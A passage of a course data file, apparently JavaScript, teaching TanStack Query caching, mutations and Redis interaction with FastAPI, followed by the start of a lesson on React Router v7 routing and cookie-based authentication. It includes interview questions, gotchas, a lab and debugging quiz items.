    <QueryErrorResetBoundary>
      {({ reset }) => (
        <ErrorBoundary
          onReset={reset}
          fallbackRender={({ error, resetErrorBoundary }) => (
            <div role="alert">
              <p>Failed: {error instanceof Error ? error.message : "Unknown error"}</p>
              <button onClick={resetErrorBoundary}>Retry</button>
            </div>
          )}
        >
          <Suspense fallback={<p>Loading todo...</p>}>
            <TodoDetail id={id} />
          </Suspense>
        </ErrorBoundary>
      )}
    </QueryErrorResetBoundary>
  );
}`,
          note: `<p>This is the production-grade version of the hand-rolled <code>use(promise)</code> cache from the previous topic: the library supplies the stable promise, caching, retries and invalidation. <code>QueryErrorResetBoundary</code> ensures that when the user clicks Retry, the failed query is reset and fetched again rather than immediately re-throwing the cached error. Two <code>useSuspenseQuery</code> calls in the <i>same</i> component run one after the other (the first suspends before the second is reached); for parallel suspenseful data use <code>useSuspenseQueries</code> or prefetch both.</p>`
        }
      ],
      internals: `<p><b>The object graph.</b> <code>QueryClient</code> → <code>QueryCache</code> (a map from <b>query hash</b> to <b>Query</b>) and <code>MutationCache</code>. A <b>Query</b> holds the state (<code>data</code>, <code>error</code>, <code>status</code>, <code>fetchStatus</code>, <code>dataUpdatedAt</code>, <code>failureCount</code>...), the current in-flight promise, its options, a GC timer and a list of <b>observers</b>. Each <code>useQuery</code> call creates a <b>QueryObserver</b> that subscribes to one Query and computes the result object your component sees (deriving <code>isPending</code>, <code>isStale</code>, etc.).</p>
<p><b>The key hash.</b> The key is serialised with a stable JSON stringify that sorts object keys, so <code>{a:1,b:2}</code> and <code>{b:2,a:1}</code> hash the same, while <code>["users", 7]</code> and <code>["users", "7"]</code> do not (number vs string, a common bug when ids come from URL params). Partial matching for <code>invalidateQueries</code> compares the filter key as a prefix of each query's key.</p>
<p><b>How it plugs into React.</b> <code>useQuery</code> uses <code>useSyncExternalStore</code> to subscribe the component to its observer, which is how an external cache stays consistent with concurrent rendering (no tearing). Observers track which result properties you actually read (<b>tracked properties</b>, on by default) and only notify the component when one of those changes, so a component that only reads <code>data</code> does not re-render when <code>isFetching</code> flips. New data is merged with <b>structural sharing</b>: unchanged sub-objects keep their old references, so <code>React.memo</code> children and dependency arrays stay stable across refetches that return identical JSON.</p>
<p><b>Fetching.</b> When a fetch is needed, the Query creates a <b>retryer</b>: it calls your <code>queryFn</code> with an <code>AbortSignal</code>, handles retries with backoff, and pauses when the network is offline (<code>fetchStatus: "paused"</code>, under the default <code>networkMode: "online"</code>). Concurrent requests for the same Query reuse the in-flight promise (deduplication). If you read <code>signal</code> in the queryFn and all observers unmount, or the query is cancelled, Query aborts the request; if you never read <code>signal</code>, the request completes and is still cached.</p>
<p><b>Freshness and triggers.</b> "Stale" is computed: <code>Date.now() - dataUpdatedAt &gt; staleTime</code> (or the query was invalidated). A <code>focusManager</code> listens to <code>visibilitychange</code> and an <code>onlineManager</code> to online/offline events; on those events the client refetches stale queries that have observers with the corresponding option enabled.</p>
<p><b>Garbage collection.</b> When the last observer unsubscribes, the Query schedules removal after <code>gcTime</code>. A new observer cancels the timer. That's why data survives navigation for 5 minutes by default even though no component holds it.</p>
<p><b>Mutations.</b> Each <code>useMutation</code> creates a <b>MutationObserver</b>; <code>mutate</code> creates a <b>Mutation</b> in the <code>MutationCache</code> that runs <code>onMutate</code> → <code>mutationFn</code> (with retries, default 0 for mutations) → <code>onSuccess</code>/<code>onError</code> → <code>onSettled</code>, awaiting returned promises. The mutation has no link to any query: invalidation is your explicit instruction, which is why forgetting it leaves stale lists.</p>`,
      prod: `<p><b>How it looks in a React + FastAPI app.</b> One <code>QueryClient</code> with app-wide defaults (a non-zero <code>staleTime</code>, retry only on 5xx/network errors, a global <code>QueryCache.onError</code> that reports to Sentry and shows a toast for background failures). Each feature folder has <code>queries.ts</code> (key factory + <code>queryOptions</code>) and <code>mutations.ts</code> (hooks wrapping <code>useMutation</code> with the right invalidations). Routes prefetch their primary data in loaders; components call <code>useQuery(featureQueries.x(...))</code>. MSW handlers in tests (Day 14) mirror the same endpoints, and tests create a fresh <code>QueryClient</code> per test with <code>retry: false</code>.</p>
<p><b>What goes wrong at scale:</b></p>
<ul class="pts">
<li><b>Key mistakes</b> are the #1 bug class: a key missing a parameter (shared cache between users or filters), number vs string ids, or inline keys that don't match the invalidation key. Key factories, <code>queryOptions</code> and the Devtools catch most of them.</li>
<li><b>Over-fetching from defaults.</b> With <code>staleTime: 0</code>, every mount, tab focus and reconnect refetches every visible query. On a busy dashboard that is a request storm against FastAPI every time a user alt-tabs. Set <code>staleTime</code> per data type: seconds for live data, minutes for reference data, <code>Infinity</code> for things that only change through your own mutations.</li>
<li><b>Two-layer staleness.</b> A user edits a record, the mutation invalidates, the refetch hits FastAPI... which returns the old value from Redis because the write path didn't delete the key. Users report "my change disappeared then came back". Rule: every FastAPI write that changes cached data deletes or updates the Redis keys (cache-aside invalidation), ideally in the same service function as the DB write, and per-user Redis keys include the user id. Also check intermediate HTTP caches (<code>Cache-Control</code> on API responses, a CDN) which are a third layer.</li>
<li><b>Logout and multi-tenant leaks.</b> The query cache outlives the session unless you clear it: call <code>queryClient.clear()</code> on logout, and include tenant/user ids in keys if a user can switch accounts without a reload.</li>
<li><b>Optimistic updates that lie.</b> If the server applies business rules (e.g. a discount recalculates a total), the optimistic value is wrong until the refetch. Keep optimistic updates for simple, predictable changes (toggles, renames, likes), and always invalidate on settle.</li>
<li><b>Real-time data.</b> For data pushed over WebSockets/SSE from FastAPI, update the cache with <code>setQueryData</code> or invalidate the affected keys when messages arrive, rather than polling with short <code>refetchInterval</code>s.</li>
<li><b>Memory.</b> Infinite feeds and large <code>gcTime</code>s keep a lot in memory on long-lived tabs; use <code>maxPages</code> and sensible <code>gcTime</code>s.</li>
</ul>`,
      iq: [
        ["fresher", "What problem does TanStack Query solve that <code>useEffect</code> + <code>useState</code> doesn't?", "It manages <b>server state</b> as a cache: data is shared across components by key, requests are deduplicated, results are cached across navigation, stale data is refetched in the background (on mount, focus, reconnect), failures are retried, outdated requests are cancelled, and mutations can invalidate related data. With raw effects every component re-implements loading/error/data, race-condition cleanup and refetching, usually inconsistently. It does not replace client state tools for things like UI toggles."],
        ["mid", "What's the difference between <code>staleTime</code> and <code>gcTime</code>?", "<code>staleTime</code> (default 0) is how long fetched data counts as fresh; while fresh, no refetch happens. After that it's stale: still shown, but refetched in the background on triggers like mount or window focus. <code>gcTime</code> (default 5 minutes, called <code>cacheTime</code> before v5) is how long a query with no mounted observers stays in memory before removal. A common wrong answer is that <code>gcTime</code> controls when data refetches; it only controls when unused data is forgotten."],
        ["mid", "What's the difference between <code>isPending</code>, <code>isLoading</code> and <code>isFetching</code> in v5?", "<code>isPending</code>: there's no data yet (status <code>'pending'</code>). <code>isFetching</code>: a request is in flight right now, including background refetches when data already exists. <code>isLoading</code>: <code>isPending &amp;&amp; isFetching</code>, i.e. the first load is actually happening. A disabled query with no data is pending but not loading. Use <code>isPending</code> for the full-page spinner and <code>isFetching</code> for a subtle refresh indicator. In v4, <code>isLoading</code> meant what v5 calls <code>isPending</code>, which is why old tutorials are confusing."],
        ["mid", "After creating a todo with a POST, the list doesn't update. Why, and how do you fix it?", "Mutations don't know which queries they affect; the list is still a fresh (or stale but not refetched) cache entry. In the mutation's <code>onSuccess</code> or <code>onSettled</code>, call <code>queryClient.invalidateQueries({ queryKey: ['todos', 'list'] })</code> (prefix match) so active lists refetch, or update the cache directly with <code>setQueryData</code> using the response. Returning the invalidation promise keeps the mutation pending until the list is fresh. Calling <code>refetch()</code> from the component is the tempting wrong fix: it only refreshes that one observer's query and couples the form to the list."],
        ["mid", "What should go into a query key?", "Every variable the <code>queryFn</code> uses to fetch: resource name, ids, filters, pagination, and the user/tenant if the data is per-user and the user can change without a reload. Keys are arrays hashed deterministically (object key order ignored), and different keys are separate cache entries. If a variable is missing from the key, different inputs share one cache entry and show each other's data. Use a key factory so keys are consistent and invalidation prefixes match."],
        ["senior", "Walk through implementing an optimistic update with rollback in TanStack Query v5.", "In <code>onMutate</code>: <code>await queryClient.cancelQueries({ queryKey })</code> so in-flight refetches don't overwrite the optimistic value; snapshot with <code>getQueryData</code>; write the expected value immutably with <code>setQueryData</code>; return <code>{ previous }</code>. In <code>onError(err, vars, context)</code>: restore <code>context.previous</code>. In <code>onSettled</code>: <code>invalidateQueries</code> to resync with the server whether it succeeded or failed. Alternative for single-place UI: render <code>mutation.variables</code> while <code>isPending</code>, no cache changes needed. Forgetting <code>cancelQueries</code> causes a flicker back to the old value."],
        ["senior", "How would you implement infinite scroll against a FastAPI endpoint that uses cursor pagination?", "<code>useInfiniteQuery</code> with <code>queryKey: ['posts','feed']</code>, a <code>queryFn</code> that reads <code>pageParam</code> as the cursor, <code>initialPageParam: null</code>, and <code>getNextPageParam: last =&gt; last.next_cursor</code> (null/undefined means no more). Render <code>data.pages.flatMap(p =&gt; p.items)</code>, call <code>fetchNextPage()</code> from an IntersectionObserver sentinel when <code>hasNextPage &amp;&amp; !isFetchingNextPage</code>, virtualise the list, and bound memory with <code>maxPages</code>. Cursor (keyset) pagination beats offset because inserts don't shift pages; note that refetching an infinite query re-requests its pages sequentially."],
        ["senior", "Why might a component re-render less with TanStack Query than you'd expect, and when does structural sharing matter?", "Observers use tracked properties: the component only re-renders when a result field it actually read changes, so reading only <code>data</code> ignores <code>isFetching</code> flips. Structural sharing keeps object references for unchanged parts of refetched data, so memoised children and effect dependencies don't fire when the server returns identical JSON. It matters with large lists and <code>React.memo</code> rows; you can turn it off (<code>structuralSharing: false</code>) for huge payloads where the deep comparison costs more than it saves."],
        ["lead", "How do you organise queries and mutations in a large codebase?", "Per feature: a key factory and <code>queryOptions</code> objects in <code>queries.ts</code>, custom mutation hooks in <code>mutations.ts</code> that own their invalidations, typed API functions underneath. Components never write raw keys. Global defaults for <code>staleTime</code> and retry live in one <code>QueryClient</code>; global error reporting via <code>QueryCache</code>/<code>MutationCache</code> callbacks. Clear the cache on logout. Tests use a fresh client with <code>retry: false</code> and MSW. Lint against inline <code>queryKey</code> literals and use the official ESLint plugin."],
        ["architect", "The backend caches responses in Redis. Do you still need TanStack Query, and how do the two caches interact?", "Yes: they solve different problems. TanStack Query is per-tab, per-user memory: it removes round trips, dedupes, drives loading states and gives instant navigation. Redis is shared server-side: it protects PostgreSQL and cuts latency for all users but can't save the network trip. Their staleness compounds (Redis TTL + <code>staleTime</code>), and invalidation must happen at both layers: FastAPI must delete/update Redis keys on writes, otherwise client invalidation refetches stale Redis data. Per-user data needs user ids in both Redis keys and query keys. Choose TTLs and <code>staleTime</code> per data type based on how stale each can be."],
        ["architect", "When would you choose router loaders, TanStack Query, or both?", "Loaders start data fetching at navigation time, in parallel with code loading, which removes render-then-fetch waterfalls, but on their own they don't provide a long-lived cache, dedupe across components, background refetch or mutation-driven invalidation. TanStack Query provides those but, used only in components, starts fetching after render. The common combination: loaders call <code>ensureQueryData</code>/<code>prefetchQuery</code> with the same <code>queryOptions</code>, and components read with <code>useQuery</code>/<code>useSuspenseQuery</code>. In frameworks with Server Components, server-side fetching may replace some client queries, with TanStack Query kept for interactive client data (Day 13)."]
      ],
      gotchas: [
        `<b>Missing variables in the key</b>: <code>queryKey: ["user"]</code> with <code>queryFn: () =&gt; getUser(id)</code> means every id shares one cache entry, so user 2's page shows user 1. The official ESLint plugin (<code>@tanstack/eslint-plugin-query</code>) has an <code>exhaustive-deps</code> rule for exactly this.`,
        `<b>Number vs string ids</b>: <code>["todos", 5]</code> from a list and <code>["todos", "5"]</code> from <code>useParams()</code> are different cache entries; prefetching or invalidating one misses the other. Convert params with <code>Number()</code> at the edge.`,
        `<b>Creating the <code>QueryClient</code> inside a component body</b> creates a new empty cache on every render. Create it at module level (or once with <code>useState(() =&gt; new QueryClient())</code> in SSR setups).`,
        `<b><code>staleTime: 0</code> by default</b> means refetch on every mount and every window focus. Developers see "too many requests" when they switch tabs during debugging and blame the library; tune <code>staleTime</code>.`,
        `<b>Error state appears late</b>: three retries with backoff means several seconds of spinner before <code>isError</code>. Disable retries for 4xx and in tests (<code>retry: false</code>), or tests will time out.`,
        `<b><code>mutateAsync</code> rejects</b> on error: an un-awaited or un-caught call produces an unhandled promise rejection. Use <code>mutate</code> unless you really need the promise.`,
        `<b>Optimistic update without <code>cancelQueries</code></b>: a refetch already in flight lands after your <code>setQueryData</code> and briefly reverts the UI to the old value.`,
        `<b>Mutating cached data in place</b> (<code>old.push(newTodo)</code> inside <code>setQueryData</code>) breaks change detection and structural sharing. Always return new arrays/objects.`,
        `<b>Two <code>useSuspenseQuery</code> calls in one component</b> form a waterfall: the first suspends, so the second isn't reached until the first resolves. Use <code>useSuspenseQueries</code> or prefetch.`,
        `<b>Invalidation is not enough if the backend caches</b>: if FastAPI serves the refetch from an un-invalidated Redis key, the UI shows the old value after a successful write.`
      ],
      best: [
        `Create one <code>QueryClient</code> at module level with sensible defaults: a non-zero <code>staleTime</code>, retries only for network/5xx errors, and global error reporting through <code>QueryCache</code>.`,
        `Use a query-key factory and <code>queryOptions</code> per feature; never hand-type keys in components; include every <code>queryFn</code> input in the key.`,
        `Always pass the <code>signal</code> from the query context into your API client so outdated requests are cancelled.`,
        `Wrap mutations in custom hooks that own their invalidation (or <code>setQueryData</code>) logic; return the invalidation promise from <code>onSettled</code>.`,
        `Use optimistic updates for simple, predictable changes, with the full cancel → snapshot → set → rollback → invalidate recipe; prefer the <code>variables</code>-based approach when only one component shows the change.`,
        `Prefetch on intent and in route loaders to avoid waterfalls; use <code>placeholderData: keepPreviousData</code> for paginated tables and <code>useInfiniteQuery</code> with cursor pagination for feeds.`,
        `Design both cache layers together: Redis invalidation on every FastAPI write, user/tenant ids in both Redis keys and query keys, and <code>queryClient.clear()</code> on logout.`
      ],
      lab: [
        `In your Vite app run <code>npm install @tanstack/react-query @tanstack/react-query-devtools</code>, set up the <code>QueryClient</code> and Devtools in <code>main.tsx</code>, and convert yesterday's <code>UserProfile</code> to <code>useQuery</code>. Switch between users and watch the cache entries appear in the Devtools.`,
        `Add a FastAPI todo API (<code>GET /api/todos?status=</code>, <code>POST /api/todos</code>, <code>PATCH /api/todos/{id}</code>) with an in-memory list (or PostgreSQL if you have it). Make <code>PATCH</code> fail randomly 30% of the time with <code>HTTPException(500)</code>.`,
        `Create <code>src/features/todos/queries.ts</code> with the key factory and <code>queryOptions</code>, render a filtered list, and confirm in the Devtools that each filter is its own key.`,
        `Build <code>AddTodo</code> with <code>useMutation</code>. First omit the invalidation and observe the stale list; then add <code>invalidateQueries({ queryKey: todoKeys.lists() })</code> and confirm the POST is followed by a GET in the Network tab.`,
        `Implement <code>useToggleTodo</code> with the optimistic recipe. Click checkboxes rapidly and watch failed toggles roll back.`,
        `Add <code>GET /api/posts?cursor=&amp;limit=</code> on FastAPI returning <code>{items, next_cursor}</code> and build the <code>Feed</code> with <code>useInfiniteQuery</code>. Add hover prefetching on todo links and verify in the Network tab that the detail request happens on hover, not on click.`,
        `<b>Done when:</b> switching back to a visited user is instant with no spinner, adding a todo updates the list without a reload, failed toggles visibly roll back, the feed loads more pages until "No more posts", and the Devtools show the expected keys (<code>["todos","list",{...}]</code>, <code>["todos","detail",n]</code>, <code>["posts","feed"]</code>).`
      ],
      teach: `<p>"TanStack Query is a cache for server state. Instead of every component fetching in an effect, components say 'I need the data for this key', like <code>['users', 7]</code>. The key identifies the cache entry, so it must contain everything the fetch depends on, or different users end up sharing data.</p>
<p>Two timers matter. <code>staleTime</code> is how long data counts as fresh; while it's fresh there's no refetch. Once it's stale, it's still shown immediately, but refetched in the background on mount, window focus or reconnect. <code>gcTime</code> is how long unused data stays in memory, five minutes by default. In v5, <code>isPending</code> means no data yet and <code>isFetching</code> means a request is in flight. It also dedupes requests, retries failures three times, and cancels outdated requests through the abort signal.</p>
<p>For writes I use <code>useMutation</code>, and after success I invalidate the affected keys so they refetch. A key factory makes that reliable, because invalidation matches by prefix. For optimistic updates: cancel in-flight queries, snapshot, write the expected value, roll back on error, invalidate when settled. For feeds, <code>useInfiniteQuery</code> maps directly onto FastAPI's cursor pagination, and prefetching on hover or in route loaders removes waterfalls.</p>
<p>Finally, it's not a replacement for Redis on the backend. Redis is shared and protects Postgres; TanStack Query is per tab and saves round trips. Their staleness adds up, and a write must invalidate both, or my refetch just returns the old Redis value."</p>`
    }
  ],
  quiz: [
    {
      q: `A profile page has Previous/Next buttons. Users report that after clicking Next quickly a few times, the heading says "User 5" but the details are User 3's. Find the bug.`,
      code: `function UserDetails({ userId }: { userId: number }) {
  const [user, setUser] = useState<User | null>(null);
  useEffect(() => {
    getUser(userId).then(setUser);
  }, [userId]);
  return <p>{user?.email}</p>;
}`,
      lang: "tsx",
      ans: `A race condition: the effect has no cleanup, so a slow response for an older <code>userId</code> can arrive after the newer one and overwrite it.`,
      why: `<p>Each click starts a new request while older ones are still in flight, and responses arrive in whatever order the server finishes them. Fix: create an <code>AbortController</code> in the effect, pass <code>signal</code> to the request, and call <code>abort()</code> in the cleanup (or use an <code>ignore</code> flag). React runs the old cleanup before the new effect, so only the latest request can call <code>setUser</code>. Better still, <code>useQuery({ queryKey: ["users", userId], ... })</code> makes the problem impossible, because each id writes to its own cache entry.</p>`
    },
    {
      q: `After submitting the "New todo" form, the POST returns 201 but the list still shows the old items until the user refreshes the page or switches tabs. What's missing?`,
      code: `const addTodo = useMutation({
  mutationFn: (title: string) =>
    api<Todo>("/api/todos", { method: "POST", body: JSON.stringify({ title }) }),
});

const todos = useQuery({
  queryKey: ["todos", "list", filters],
  queryFn: () => fetchTodos(filters),
  staleTime: 60_000,
});`,
      lang: "tsx",
      ans: `The mutation never invalidates (or updates) the list queries, so they keep serving their cached, still-fresh data.`,
      why: `<p>Mutations don't know which queries they affect. With <code>staleTime: 60_000</code> the list counts as fresh for a minute, so nothing refetches it. The tab switch "fixes" it only after the data goes stale (refetch on window focus). Add <code>onSuccess: () =&gt; queryClient.invalidateQueries({ queryKey: ["todos", "list"] })</code>, which prefix-matches every filtered list. Alternatively, insert the returned todo with <code>setQueryData</code>. Lowering <code>staleTime</code> is the wrong fix: it adds requests everywhere and still leaves a window where the list is wrong.</p>`
    },
    {
      q: `An admin opens user 1's page, then user 2's. User 2's page shows user 1's name for a moment, sometimes permanently until a refresh. What's wrong?`,
      code: `function useUser(id: number) {
  return useQuery({
    queryKey: ["user"],
    queryFn: () => getUser(id),
    staleTime: 5 * 60_000,
  });
}`,
      lang: "tsx",
      ans: `The query key doesn't include <code>id</code>, so every user shares one cache entry; with a 5-minute <code>staleTime</code> the cached user 1 is served as fresh for user 2.`,
      why: `<p>The cache is looked up by key only. <code>["user"]</code> already has fresh data (user 1), so no request is made for user 2. The key must contain every input to the <code>queryFn</code>: <code>queryKey: ["users", id]</code>. Use a key factory (<code>userKeys.detail(id)</code>) or <code>queryOptions</code> to make this hard to get wrong, and enable the <code>@tanstack/eslint-plugin-query</code> <code>exhaustive-deps</code> rule, which flags variables used in <code>queryFn</code> but missing from the key.</p>`
    },
    {
      q: `A developer tries React 19's <code>use</code> and the page shows "Loading..." forever, while the Network tab shows <code>/api/users/1</code> being requested over and over. Why?`,
      code: `function UserName({ id }: { id: number }) {
  const user = use(getUser(id));
  return <h2>{user.name}</h2>;
}

<Suspense fallback={<p>Loading...</p>}>
  <UserName id={1} />
</Suspense>`,
      lang: "tsx",
      ans: `The promise is created during render, so every render (including the retry after it resolves) creates a new pending promise, which suspends again.`,
      why: `<p><code>use</code> relies on getting the <i>same</i> promise instance when React retries the render; React records the settled value on that promise. A fresh promise each time is always pending, so the component never gets past <code>use</code>, and React warns about an uncached promise. Create the promise outside render: a module-level cache keyed by id (evicting failures), a route loader, a parent that stores it, or a Suspense-aware library such as TanStack Query's <code>useSuspenseQuery</code>.</p>`
    },
    {
      q: `A user renames a project. The mutation succeeds (200), <code>invalidateQueries</code> runs, the list refetches... and still shows the old name for about a minute. TanStack Query is configured correctly. Where would you look?`,
      code: `# FastAPI
@app.get("/api/projects")
async def list_projects(user=Depends(current_user)):
    key = f"projects:{user.id}"
    if cached := await redis.get(key):
        return json.loads(cached)
    rows = await db.fetch_projects(user.id)
    await redis.set(key, json.dumps(rows), ex=60)
    return rows

@app.patch("/api/projects/{pid}")
async def rename(pid: int, body: Rename, user=Depends(current_user)):
    return await db.rename_project(pid, body.name, user.id)`,
      lang: "py",
      ans: `The backend's Redis cache: the PATCH handler updates PostgreSQL but never deletes <code>projects:{user.id}</code>, so the refetch is served the old list until the 60 s TTL expires.`,
      why: `<p>There are two caches with different jobs. TanStack Query did its part: it marked the list stale and refetched. But FastAPI answered from Redis. Fix the write path: after the DB update, <code>await redis.delete(f"projects:{user.id}")</code> (and any other keys that contain the project). As a rule, every write that changes cached data invalidates the server cache in the same code path. Client-side workarounds (polling, <code>staleTime: 0</code>) don't help, because the server keeps returning stale data.</p>`
    },
    {
      q: `Which status flag would you use for each UI element in a list that already has data, while a background refetch triggered by window focus is running: (a) the full-page skeleton, (b) a small "refreshing" spinner in the header?`,
      ans: `(a) <code>isPending</code>, which is false here because data exists, so no skeleton; (b) <code>isFetching</code>, which is true during the background refetch.`,
      why: `<p>In v5, <code>isPending</code> means "no data yet" and <code>isFetching</code> means "a request is in flight", whether it's the first load or a background refetch. Using <code>isFetching</code> for the skeleton is the classic mistake: the whole page flashes to a skeleton every time the user returns to the tab, throwing away the stale-while-revalidate benefit. <code>isLoading</code> (<code>isPending &amp;&amp; isFetching</code>) is also false here.</p>`
    }
  ]
},
/* ===== Day 8 ===== */
{
  n: 8,
  title: "Routing and authentication",
  goal: `<b>By the end of today</b> you can build a multi-page React app with React Router v7 in data mode (nested layouts, params, search params, loaders, actions, error and 404 routes), deploy it so a browser refresh never 404s, and put a real cookie-based login in front of it: an <code>AuthProvider</code> backed by FastAPI's <code>/api/me</code>, protected and role-gated routes that don't flash, global 401 handling with token refresh, a logout that leaves no data behind, and route-level code splitting.`,
  rev: [
    `<b>Client-side routing</b> = the History API (<code>pushState</code>, <code>popstate</code>) plus a router that maps the URL to a tree of components. The server knows nothing about <code>/projects/42</code>, so production must <b>fall back to <code>index.html</code></b> for every non-file, non-API path (nginx <code>try_files $uri $uri/ /index.html;</code> or a FastAPI catch-all registered after the API routes). Otherwise refresh and deep links return 404.`,
    `<b>React Router v7 data mode:</b> <code>createBrowserRouter([...routes])</code> + <code>&lt;RouterProvider router={router} /&gt;</code>. Nested <code>children</code> render into the parent's <code>&lt;Outlet /&gt;</code>; pathless routes are layouts; <code>index: true</code> is the default child; <code>path: "*"</code> is the 404. Read the URL with <code>useParams</code>, <code>useSearchParams</code>, <code>useLocation</code>; move with <code>&lt;Link&gt;</code>, <code>&lt;NavLink&gt;</code>, <code>useNavigate</code>, <code>redirect</code>.`,
    `<b>Loaders</b> run before a route renders (in parallel for all matched routes, with an abortable <code>request.signal</code>); <b>actions</b> handle <code>&lt;Form method="post"&gt;</code> submissions and then <b>revalidate</b> loaders. Errors thrown anywhere in a route (render, loader, action) go to the nearest <code>errorElement</code>; <code>throw data("Not found", { status: 404 })</code> + <code>isRouteErrorResponse</code> gives typed HTTP errors. Search params are state: filters and pagination belong in the URL.`,
    `<b>Auth with FastAPI:</b> prefer <b>httpOnly, Secure, SameSite cookies</b> (JS can't read them, so XSS can't steal them) over JWTs in <code>localStorage</code>. Short-lived access token + long-lived rotated refresh token (revocable in Redis). Cookies bring CSRF: <code>SameSite=Lax</code> plus a CSRF header (double-submit) for state-changing requests. <code>AuthProvider</code> = a TanStack Query on <code>/api/me</code> with three states: <i>loading</i>, <i>anonymous</i>, <i>authenticated</i>.`,
    `<b>Protected routes:</b> while auth is <i>loading</i> render a spinner (never the page, never a redirect: that is the "flash"); when <i>anonymous</i> <code>&lt;Navigate to="/login" replace state={{ from: location }} /&gt;</code> and send the user back after login (validate any <code>redirectTo</code> to avoid open redirects). Role-based UI is cosmetic: <b>FastAPI must enforce</b> every permission. Handle 401 once, globally (fetch wrapper with single-flight refresh + <code>QueryCache</code> <code>onError</code>); logout clears the cache; split routes with <code>React.lazy</code> + <code>Suspense</code> or route <code>lazy</code>.`
  ],
  topics: [
    /* ------------------------------------------------------------------ */
    {
      id: "d8-routing",
      title: "Routing with React Router: nested layouts, params, loaders and actions",
      lv: ["fresher", "mid", "senior", "lead"],
      eli5: `<p>Picture a big office building with one front door. Every visitor hands the receptionist a slip of paper with an address on it: "Floor 3, Projects, Room 42". The receptionist doesn't build a new building for each visitor; she just walks them to the right room. The <b>URL</b> is the slip of paper, and the <b>router</b> is the receptionist. The building (your React app) is loaded once; after that, moving between "rooms" only swaps what you see.</p>
<p>Every floor has a shared corridor: the same signs, the same lifts, the same coffee machine. Only the room at the end changes. That corridor is a <b>layout</b>: the header and sidebar stay, and the part in the middle (the <b>outlet</b>) shows whichever room you asked for.</p>
<p>A good receptionist also fetches the files you'll need <i>before</i> you reach the room, so you don't sit in an empty room waiting. Those are <b>loaders</b>. And if you hand in a form ("please create a new project"), she takes it to the right department and then walks you to the new room. Those are <b>actions</b> and <b>redirects</b>.</p>
<p>One catch: if you arrive by taxi and tell the <i>street security guard</i> (the web server) "Room 42, please", he has never heard of Room 42. He must be told: "for any room you don't recognise, send them to reception (<code>index.html</code>)". Forget that, and people who refresh the page or follow a shared link are turned away with a 404.</p>`,
      what: `<p><b>Client-side routing</b> means the browser loads one HTML document and one JavaScript app, and from then on the app itself decides what to render for each URL. Navigation changes the URL with the <b>History API</b> (<code>history.pushState</code> / <code>replaceState</code>) without a document request, and the app listens for the <code>popstate</code> event to react to Back and Forward. A router library wraps all of this and maps URL → component tree.</p>
<h5>React Router v7: one package, three modes</h5>
<p>In v7 everything ships from the <code>react-router</code> package (<code>react-router-dom</code> still exists, but only re-exports it for easier upgrades). The same library can be used in three ways:</p>
<ul class="pts">
<li><b>Declarative mode:</b> <code>&lt;BrowserRouter&gt;&lt;Routes&gt;&lt;Route path element /&gt;&lt;/Routes&gt;&lt;/BrowserRouter&gt;</code>. Matching, links and hooks, but no loaders, actions or route-level error handling. This is what most v5/v6 tutorials show.</li>
<li><b>Data mode</b> (this course): <code>createBrowserRouter(routes)</code> creates a router <i>outside</i> React, and <code>&lt;RouterProvider router={router} /&gt;</code> renders it. You get everything from declarative mode plus <code>loader</code>, <code>action</code>, <code>errorElement</code>, <code>lazy</code>, pending UI (<code>useNavigation</code>) and fetchers.</li>
<li><b>Framework mode:</b> a Vite plugin (<code>@react-router/dev</code>) plus a <code>routes.ts</code> file; it adds server rendering, pre-rendering, file-based or config-based routes and generated route types. This is the evolution of <b>Remix</b>, which merged into React Router. It is a full-stack framework choice (closer to Next.js, Day 13); details of its config and type generation move quickly between minor releases, so follow the current docs rather than memorising them.</li>
</ul>
<h5>Route objects</h5>
<p>In data mode routes are plain objects. The fields you use every day:</p>
<ul class="pts">
<li><code>path</code>: a pattern relative to the parent. Static segments (<code>projects</code>), <b>dynamic segments</b> (<code>:projectId</code>), optional segments (<code>:lang?</code>), and a <b>splat</b> (<code>*</code>) that matches the rest.</li>
<li><code>element</code> (a JSX element) or <code>Component</code> (a component type). Use one or the other.</li>
<li><code>children</code>: nested routes. Their element renders inside the parent's <code>&lt;Outlet /&gt;</code>.</li>
<li><code>index: true</code>: the default child shown at the parent's exact URL (no <code>path</code>, no <code>children</code>).</li>
<li><code>loader</code>, <code>action</code>: data functions (below). <code>errorElement</code> or <code>ErrorBoundary</code>: what to render when something in this route throws.</li>
<li><code>lazy</code>: load the route's code on demand (covered in the auth topic under code splitting). <code>handle</code>: arbitrary data such as breadcrumbs, read with <code>useMatches</code>. <code>id</code>: for <code>useRouteLoaderData(id)</code>.</li>
</ul>
<p>Matching is <b>ranked, not first-match</b>: <code>/projects/new</code> beats <code>/projects/:projectId</code> no matter which is listed first, because static segments score higher than dynamic ones, which score higher than splats.</p>
<h5>Nested routes, layouts and the Outlet</h5>
<p>A URL like <code>/projects/42</code> usually matches a <b>chain</b> of routes: root layout → projects layout → project page. React Router renders the first match's element, and each <code>&lt;Outlet /&gt;</code> renders the next match down. A route with an element but <b>no path</b> is a <b>layout route</b>: it wraps its children without adding a URL segment, which is how you give a group of pages a shared shell or a shared guard (the auth topic uses this for <code>RequireAuth</code>).</p>
<h5>Moving around</h5>
<ul class="pts">
<li><code>&lt;Link to="/projects/42"&gt;</code> renders a real <code>&lt;a href&gt;</code>, so middle-click, Ctrl-click, "copy link" and accessibility all work; a plain left click is intercepted and turned into a client navigation. Relative <code>to</code> values (<code>"edit"</code>, <code>".."</code>) resolve against the <i>route hierarchy</i>.</li>
<li><code>&lt;NavLink&gt;</code> is a Link that knows whether it is active; <code>className</code>, <code>style</code> and <code>children</code> can be functions receiving <code>{ isActive, isPending }</code>. Add <code>end</code> to match only the exact path, not descendants. It also sets <code>aria-current="page"</code> when active.</li>
<li><code>useNavigate()</code> returns <code>navigate(to, { replace, state })</code> or <code>navigate(-1)</code>, for navigation after an event (a successful save, a timeout). <code>&lt;Navigate to /&gt;</code> does the same during render. In loaders and actions use <code>redirect("/path")</code>.</li>
</ul>
<h5>Reading the URL</h5>
<ul class="pts">
<li><code>useParams()</code>: the dynamic segments, typed <code>string | undefined</code> because the hook can't prove which route you are in.</li>
<li><code>useSearchParams()</code>: <code>[searchParams, setSearchParams]</code>, like <code>useState</code> but stored in the query string. Ideal for filters, sorting, tabs and pagination: the state survives refresh, can be shared and bookmarked, and Back undoes it.</li>
<li><code>useLocation()</code>: the full location (<code>pathname</code>, <code>search</code>, <code>hash</code>, <code>state</code>, <code>key</code>). <code>state</code> is invisible data attached to a history entry (used for "redirect back after login").</li>
</ul>
<h5>Loaders and actions (data mode)</h5>
